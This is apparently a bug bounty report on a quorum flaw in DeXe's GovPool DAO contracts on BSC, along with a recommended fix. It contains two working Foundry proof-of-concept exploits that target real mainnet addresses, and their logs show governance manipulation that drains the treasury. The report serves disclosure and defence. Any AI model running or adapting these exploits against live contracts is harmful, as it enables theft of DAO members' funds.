## The attacker can duplicate votes by changing the totalSupply of DeXe

Target: 

https://bscscan.com/address/0xB562127efDC97B417B3116efF2C23A29857C0F0B


### Brief/Intro

This governance DAO system does not use snapshots. However, it implements very sophisticated logic to provide an impeccable voting mechanism in all aspects. But there is one important fact to note: the quorum is calculated using the total supply of DeXe tokens at the time of calculation. The attacker can change the total supply to revert a proposal from a Locked state back to a Voting state and can then re-vote using a different address with the same funds.

### Vulnerability Details

Problematic functions

`GovPool.getProposalRequiredQuorum`

`GovPoolVote._quorumReached`

`GovPooVote._updateGlobalState`

`GovPoolView.getProposalState`

The GovPool contract doesn't have a storage value for current proposal state.

```solidity
quorum  = 50000000000000000000000000 (current all settings have this quorum)

(https://bscscan.com/address/0x57CbF649aC9b87FF8d0c710842bc26b5d05be566#readProxyContract)

PERCENTAGE_100 = 10 ** 27

requiredQuorum = GovUserKeeper.getTotalPower() * settings.quorum / PERCENTAGE_100 = 
= DeXe.totalSupply / 20
```

### Attack Scenario 1.

The attacker creates a proposal to transfer all DeXe tokens from the GovPool to his own wallet.

The DAO members will vote against this proposal.

When the number of opposing votes is between 50% and 75% of the required quorum, the attacker casts votes in favor so that the total number of votes matches or slightly exceeds the required quorum, while keeping the number of votes in favor less than the number of opposing votes.

If earlyCompletion is set to true, the proposal can no longer be voted on and becomes Locked. Since the proposal is not in an active state, the attacker can unlock and withdraw the funds used in the next block.

Now, the attacker uses a bridge to transfer DEXE tokens from the Ethereum network to BSC. If the required quorum and the total number of votes are the same, transferring just 1 DEXE token is enough.

At this point, the total supply of DEXE tokens on BSC increases, causing the required quorum to increase as well.

Consequently, the state of the malicious proposal changes from Locked to Voting.

The attacker then quickly transfers his funds to another address and votes again using that address.

This way, the attacker can exercise voting power twice with their funds and pass the proposal with a voting power less than half of the required quorum.

The proposal can be executed 30 minutes later.

POC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "./interfaces/IGovPool.sol";

interface IGovUserKeeper {
    function depositTokens(
        address payer,
        address receiver,
        uint256 amount
    ) external;

    function tokenBalance(
        address voter,
        IGovPool.VoteType voteType
    ) external view returns (uint256 balance, uint256 ownedBalance);

    function maxLockedAmount(address voter) external view returns (uint256);
}

interface Ownable {
    function owner() external view returns(address);
}

interface IDeXe is IERC20, Ownable {
    function treasury() external view returns(address);
    function burn(address account, uint256 amount) external;
    function mint(address to, uint256 amount) external;
}

contract BaseTest is PoC {
    IGovPool private govPool = IGovPool(0xB562127efDC97B417B3116efF2C23A29857C0F0B);
    IDeXe private dexeToken = IDeXe(0x6E88056E8376Ae7709496Ba64d37fa2f8015ce3e);
    IGovUserKeeper private userKeeper = IGovUserKeeper(0xbE8cB128fBCf13f7F7A362c3820f376b0971B7B2);
    address private attacker;
    address private attackerTmp;
    address private userA;

    uint256 constant ONE_TOKEN = 10 ** 18;
    uint256 private minVotesForCreating = 10_000 * ONE_TOKEN;

    function setUp() virtual public {
        vm.createSelectFork("bsc", 39293147);
        attacker = vm.createWallet("attacker").addr;
        userA = vm.createWallet("userA").addr;
        attackerTmp = vm.createWallet("attackerTmp").addr;

        deal(attacker, 10 ether);
        deal(userA, 10 ether);
        deal(dexeToken, attacker, 500_000 * ONE_TOKEN);
        deal(dexeToken, userA, 1_000_000 * ONE_TOKEN);

        deal(attackerTmp, 1 ether);
        console.log("\n>>> Initial conditions");
    }

    function testGovPool() public {
        uint256[] memory nftIds = new uint256[](0);
        uint256 proposalId;
        uint256 requiredQuorum;
        uint256 depositAmount;

        console.log("");
        console.log("------------ 1. Deposit minVotesForCreating ------------------");
        // 1. Deposit
        {
            vm.startPrank(attacker);
            // Deposit minVotesForCreating
            depositAmount = minVotesForCreating;
            dexeToken.approve(address(userKeeper), depositAmount);
            console.log(">>> Deposit minVotesForCreating to create a proposal.");
            govPool.deposit(depositAmount, nftIds);
            vm.stopPrank();
        }

        console.log("");
        console.log("------------ 2. Create a proposal ----------------------------");
        // 2. Create a proposal
        {
            vm.startPrank(attacker);

            // proposal detail
            string memory description_url = "";

            IGovPool.ProposalAction[] memory actionsOnFor = new IGovPool.ProposalAction[](2);

            // to transfer whole tokens of GovPool from GovPool to the attacker address.
            uint256 totalAmountOfGovPool = dexeToken.balanceOf(address(govPool));
            actionsOnFor[0].executor = address(dexeToken);
            actionsOnFor[0].data = abi.encodeWithSignature("transfer(address,uint256)", attacker, totalAmountOfGovPool);

            proposalId = govPool.latestProposalId() + 1;

            // for delegatedVote
            actionsOnFor[1].executor = 0x1cB61F66b04D4fB279d323fa714562076cc7E032;
            actionsOnFor[1].data = abi.encodeWithSignature("proposals(uint256)", proposalId);

            IGovPool.ProposalAction[] memory actionsOnAgainst = new IGovPool.ProposalAction[](0);

            console.log(">>> Create a proposal to transfer whole tokens of GovPool from GovPool to the attacker address");
            console.log(">>> The votingType is delegatedVotingAllowed");

            // create a proposal
            govPool.createProposal(description_url, actionsOnFor, actionsOnAgainst);
            console.log("proposalIdCreated             : ", proposalId);

            requiredQuorum = govPool.getProposalRequiredQuorum(proposalId);
            console.log("RequiredQuorum                : ", requiredQuorum);

            vm.stopPrank();
        }

        IGovPool.ProposalView[] memory proposals = govPool.getProposals(proposalId - 1, 1);
        IGovPool.Proposal memory proposal = proposals[0].proposal;
        IGovPool.ProposalState proposalState;

        bytes[] memory _data = new bytes[](1);

        console.log("");
        console.log("------------ 3. Users against the proposal -------------------");

        // 3. Users against the proposal
        // The attacker waits until the number of opposing votes is more than half but less than three-quarters of the quorum. (50% ~ 75% of requiredQuorum)
        // Let's say that user A votes against with a voting power of 65% of requiredQuorum.
        {
            vm.startPrank(userA);

            depositAmount = requiredQuorum * 65 / 100;
            dexeToken.approve(address(userKeeper), depositAmount);
            govPool.deposit(depositAmount, nftIds);

            console.log(">>> In this test, UserA votes against with a voting power of 65% of requiredQuorum");
            _data[0] = abi.encodeWithSelector(IGovPool.vote.selector, proposalId, false, depositAmount, nftIds);
            govPool.multicall(_data);

            vm.stopPrank();
        }

        console.log("");
        console.log("------------ 4. The attacker votes for the proposal ----------");
        // 4. The attacker votes with minimal amount to lock the proposal
        {
            vm.startPrank(attacker);

            depositAmount = requiredQuorum - depositAmount;
            // the attacker already deposited minVotesForCreating dexe token.
            dexeToken.approve(address(userKeeper), depositAmount - minVotesForCreating);
            govPool.deposit(depositAmount - minVotesForCreating, nftIds);

            console.log(">>> The attacker votes for the proposal with 35% of requiredQuorum");
            _data[0] = abi.encodeWithSelector(IGovPool.vote.selector, proposalId, true, depositAmount, nftIds);
            govPool.multicall(_data);

            proposalState = govPool.getProposalState(proposalId);
            console.log("- State is Defeated ? ", IGovPool.ProposalState.Defeated == proposalState);

            if (IGovPool.ProposalState.Defeated == proposalState) {
                console.log(">>> The attacker unlocks his tokens");
                console.log("maxLockedAmountBeforeUnlock   : ", userKeeper.maxLockedAmount(attacker));
                govPool.unlock(attacker);
                console.log("maxLockedAmountAfterUnlock    : ", userKeeper.maxLockedAmount(attacker));
            }

            vm.stopPrank();
        }

        vm.warp(block.timestamp + 3);
        vm.roll(block.number + 1);

        console.log("");
        console.log("------------ 5. The attacker withdraws his tokens ------------");
        // 5. The attacker withdraws his tokens and send the tokens to tmp address in the next block.
        {
            vm.startPrank(attacker);

            console.log(">>> The attacker withdraw his token and send the token to tmp address");
            console.log("beforeTmpBalance              : ", dexeToken.balanceOf(attackerTmp));
            govPool.withdraw(attackerTmp, depositAmount, nftIds);
            console.log("afterTmpBalance               : ", dexeToken.balanceOf(attackerTmp));

            vm.stopPrank();
        }

        console.log("");
        console.log("------------ 6. Mint 1 DeXe token ----------------------------");
        // 6. The attacker transfers 1 DeXe token (or more) from Ethereum network to BSC at the end time or just before the end time of the proposal

        {
            // In this case, 1 DeXe token is minted on BSC.
            // So the totalSupply of DeXe token is increased on BSC.
            // Setting the time close to the end time makes it difficult for the team to recognize and respond to the problem
            vm.warp(proposal.core.voteEnd);
            vm.roll(block.number + 86400 / 3); // 3 seconds per block on BSC.

            // In this test, it is not possible to implement token transfers using a bridge.
            address owner = 0xB6F6D86a8f9879A9c87f643768d9efc38c1Da6E7;
            console.log(">>> Mint 1 DeXe token and and it to attacker address");
            console.log(">>> * In reality, mint can be done by general users. (bridge)");
            vm.prank(owner);
            dexeToken.mint(attacker, ONE_TOKEN);

            // now the state is voting
            proposalState = govPool.getProposalState(proposalId);
            console.log("- State is Voting ? ", IGovPool.ProposalState.Voting == proposalState);
        }

        console.log("");
        console.log("------------ 7. The attacker duplicates the votes ------------");
        // 7. The attacker duplicates the votes for the proposal using the tmp address.
        {
            vm.startPrank(attackerTmp);
            console.log(">>> The attacker deposits and votes using tmp wallet");
            dexeToken.approve(address(userKeeper), depositAmount);
            govPool.deposit(depositAmount, nftIds);

            _data[0] = abi.encodeWithSelector(IGovPool.vote.selector, proposalId, true, depositAmount, nftIds);
            govPool.multicall(_data);

            proposalState = govPool.getProposalState(proposalId);
            console.log("- State is Locked ? ", IGovPool.ProposalState.Locked == proposalState);

            vm.stopPrank();
        }

        uint256 attackerBalanceBeforeExecute = dexeToken.balanceOf(attacker);

        console.log("");
        console.log("------------ 8. The attacker execute the proposal ------------");
        // 8. The attacker waits for 30 mins to execute the proposal.
        {
            proposals = govPool.getProposals(proposalId - 1, 1);
            proposal = proposals[0].proposal;

            console.log(">>> The attacker waits for 30 mins");
            vm.warp(proposal.core.executeAfter + 1);
            vm.roll(block.number + 30 * 60 / 3);

            vm.startPrank(attacker);
            proposalState = govPool.getProposalState(proposalId);
            console.log("- State is SucceededFor ?", IGovPool.ProposalState.SucceededFor == proposalState);

            // execute the proposal
            console.log(">>> The attacker executes the proposal after voteEnd + 30 mins");
            govPool.execute(proposalId);
            proposalState = govPool.getProposalState(proposalId);
            console.log("- State is ExecutedFor ?", IGovPool.ProposalState.ExecutedFor == proposalState);
            vm.stopPrank();
        }

        console.log("");

//        console.log("attackerBalanceBeforeExecute  : ", attackerBalanceBeforeExecute);
//        console.log("attackerBalanceAfterExecute   : ", dexeToken.balanceOf(attacker));
        console.log("usedDeXeAmount                : ", depositAmount + 1);
        console.log("stolenAmount                  : ", dexeToken.balanceOf(attacker) - attackerBalanceBeforeExecute - depositAmount);
    }
}

```

LOG:

```solidity
[PASS] testGovPool() (gas: 3319738)
Logs:
  
>>> Initial conditions
  
  ------------ 1. Deposit minVotesForCreating ------------------
  >>> Deposit minVotesForCreating to create a proposal.
  
  ------------ 2. Create a proposal ----------------------------
  >>> Create a proposal to transfer whole tokens of GovPool from GovPool to the attacker address
  >>> The votingType is delegatedVotingAllowed
  proposalIdCreated             :  14
  RequiredQuorum                :  1163344566800837500000000
  
  ------------ 3. Users against the proposal -------------------
  >>> In this test, UserA votes against with a voting power of 65% of requiredQuorum
  
  ------------ 4. The attacker votes for the proposal ----------
  >>> The attacker votes for the proposal with 35% of requiredQuorum
  - State is Defeated ?  true
  >>> The attacker unlocks his tokens
  maxLockedAmountBeforeUnlock   :  407170598380293125000000
  maxLockedAmountAfterUnlock    :  0
  
  ------------ 5. The attacker withdraws his tokens ------------
  >>> The attacker withdraw his token and send the token to tmp address
  beforeTmpBalance              :  0
  afterTmpBalance               :  407170598380293125000000
  
  ------------ 6. Mint 1 DeXe token ----------------------------
  >>> Mint 1 DeXe token and and it to attacker address
  >>> * In reality, mint can be done by general users. (bridge)
  - State is Voting ?  true
  
  ------------ 7. The attacker duplicates the votes ------------
  >>> The attacker deposits and votes using tmp wallet
  - State is Locked ?  true
  
  ------------ 8. The attacker execute the proposal ------------
  >>> The attacker waits for 30 mins
  - State is SucceededFor ? true
  >>> The attacker executes the proposal after voteEnd + 30 mins
  - State is ExecutedFor ? true
  
  usedDeXeAmount                :  407170598380293125000001
  stolenAmount                  :  2243173990175538220222950

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 668.58ms
```

### Attack Scenario 2.

The new impact is that exploiting the vulnerabilities mentioned in this report allows an attacker to execute the proposal without a delay of 30 minutes.

If the total number of votes meets the quorum and the current time is greater than executeAfter, the proposal is executable.

That means the proposal is executable when executeAfter is 0 and totalVotes is greater than the quorum.

If 1 DEXE token is burnt (transfer to ethereum network through bridge) when totalVotes = quorum - 1, ... Can you imagine what would happen in this case?

Yes, the proposal is viable without delay.

POC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "./DeXe/interfaces/IGovPool.sol";

interface IGovUserKeeper {
    function depositTokens(
        address payer,
        address receiver,
        uint256 amount
    ) external;

    function tokenBalance(
        address voter,
        IGovPool.VoteType voteType
    ) external view returns (uint256 balance, uint256 ownedBalance);

    function maxLockedAmount(address voter) external view returns (uint256);
}

interface Ownable {
    function owner() external view returns(address);
}

interface IDeXe is IERC20, Ownable {
    function treasury() external view returns(address);
    function burn(address account, uint256 amount) external;
    function mint(address to, uint256 amount) external;
}

interface ITokenBridge {
    function transferTokens(
        address token,
        uint256 amount,
        uint16 recipientChain,
        bytes32 recipient,
        uint256 arbiterFee,
        uint32 nonce
    ) external returns (uint64 sequence);
}


contract DeXeTest is PoC {
    IGovPool private govPool = IGovPool(0xB562127efDC97B417B3116efF2C23A29857C0F0B);
    IDeXe private dexeToken = IDeXe(0x6E88056E8376Ae7709496Ba64d37fa2f8015ce3e);
    IGovUserKeeper private userKeeper = IGovUserKeeper(0xbE8cB128fBCf13f7F7A362c3820f376b0971B7B2);
    ITokenBridge private tokenBridge = ITokenBridge(0xB6F6D86a8f9879A9c87f643768d9efc38c1Da6E7);
    address private userA;

    uint256 constant ONE_TOKEN = 10 ** 18;
    uint256 private minVotesForCreating = 10_000 * ONE_TOKEN;

    function setUp() virtual public {
        vm.createSelectFork("bsc", 39520179);
        userA = vm.createWallet("userA").addr;

        deal(userA, 10 ether);
        deal(dexeToken, userA, 2_000_000 * ONE_TOKEN);

        console.log("\n>>> Initial conditions");
    }


    // in one block.
    function testExecuteProposalWithoutDelay() public {
        vm.startPrank(userA);

        uint256 proposalId = govPool.latestProposalId();
        console.log("proposalId: ", proposalId);

        IGovPool.ProposalView[] memory proposals = govPool.getProposals(proposalId - 1, 1);
        IGovPool.Proposal memory proposal = proposals[0].proposal;
        IGovPool.ProposalState proposalState;
        uint256[] memory nftIds = new uint256[](0);

        proposalState = govPool.getProposalState(proposalId);
        console.log("- State is Voting ?", IGovPool.ProposalState.Voting == proposalState);

        uint256 requiredQuorum = govPool.getProposalRequiredQuorum(proposalId);
        proposals = govPool.getProposals(proposalId - 1, 1);
        proposal = proposals[0].proposal;
        console.log("requiredQuorum : ", requiredQuorum);
        console.log("totalVotes     : ", proposal.core.votesFor + proposal.core.votesAgainst);

        uint256 depositAmount = requiredQuorum - proposal.core.votesFor - proposal.core.votesAgainst - 1;
        dexeToken.approve(address(userKeeper), depositAmount);
        govPool.deposit(depositAmount, nftIds);

        bytes[] memory _data = new bytes[](1);
        _data[0] = abi.encodeWithSelector(IGovPool.vote.selector, proposalId, true, depositAmount, nftIds);
        govPool.multicall(_data);

        proposalState = govPool.getProposalState(proposalId);
        console.log("- State is Voting ?", IGovPool.ProposalState.Voting == proposalState);

        dexeToken.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.transferTokens(address(dexeToken), ONE_TOKEN, 2, bytes32(uint256(uint160(userA))), 0, 1717906953);

        proposalState = govPool.getProposalState(proposalId);
        console.log("- State is Voting ?", IGovPool.ProposalState.Voting == proposalState);

        console.log("- State is SucceededFor ?", IGovPool.ProposalState.SucceededFor == proposalState);

        govPool.execute(proposalId);
        proposalState = govPool.getProposalState(proposalId);
        console.log("- State is ExecutedFor ?", IGovPool.ProposalState.ExecutedFor == proposalState);

        vm.stopPrank();
    }
}

```

LOG:
```
proposalId:  15
  - State is Voting ? true
  requiredQuorum :  1164689849374014000000000
  totalVotes     :  15751685969099791348550
  - State is Voting ? true
  - State is Voting ? false
  - State is SucceededFor ? true
  - State is ExecutedFor ? true
```

This means that malicious suggestions are immediately viable.

### Impact Details

Through this method of attack, the attacker can pass malicious proposals, and all the funds in the GovPool and GovUserKeeper can be stolen.

GovPool: 2,650,344 DEXE ($34,613,500) https://bscscan.com/token/0x6E88056E8376AE7709496BA64D37FA2F8015CE3E?a=0xB562127efDC97B417B3116efF2C23A29857C0F0B GovUserKeeper: 3,647,552 DEXE($47,637,033) https://bscscan.com/token/0x6E88056E8376AE7709496BA64D37FA2F8015CE3E?a=0xbE8cB128fBCf13f7F7A362c3820f376b0971B7B2

### References

EXPLAINED: THE BEANSTALK HACK (APRIL 2022) https://www.halborn.com/blog/post/explained-the-beanstalk-hack-april-2022

### Recommendation

It is recommended to store the results in a storage variable once the voting is finished.